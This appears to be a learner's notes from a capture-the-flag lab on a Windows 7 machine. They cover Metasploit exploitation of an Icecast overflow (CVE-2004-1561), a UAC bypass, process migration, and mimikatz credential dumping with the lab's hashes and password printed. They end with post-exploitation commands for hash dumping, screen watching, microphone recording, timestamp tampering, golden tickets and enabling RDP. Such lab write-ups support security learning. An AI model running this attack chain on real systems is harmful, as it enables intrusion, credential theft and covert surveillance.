export ip=10.10.86.232

port 3389 MSRDP

port 8000 Icecast streaming video

host : DARK-PC

port 8000: IceCast: execute code overflow: CVE-2004-1561 

metasploit: use exploit/windows/http/icecast_header | set RHOST trget ip | set LHOST tun0 ip

we get meterpreter shell.

user: Dark.

Window built: 7601

Architecture: x64

run post/multi/recon/local_exploit_suggester | to check some post exploitation scrips.

found exploit | exploit/windows/local/bypassuac_eventvwr

background session ctrl+z

use post_exploit

set SESSION 1

set LHOST to tun0

Run the post exploitation.

getprivs to see all the previlages we get in that system.

and the interesting permission is: SeTakeOwnershipPrivilege

# In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Ans: spoolsc.exe | pid = 1368


# Let's check what user we are now with the command `getuid`. What user is listed?

Ans: NT AUTHORITY\SYSTEM


load kiwi for password dumping. | and it will ad some more info to help menu.


got the password for Dark-pc user: Password01!

===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
====================================


let run help again.


what command dumps hash passwords : hashdump


how to see whats going on in remote machine : screeshare.

record microphone: record_mic

how to change time stamp on target machine: timestomp

goden ticket by mimikatz: golden_ticket_create

how to enable remote desktop service on target pc: run post/windows/manage/enable_rdp

Finished.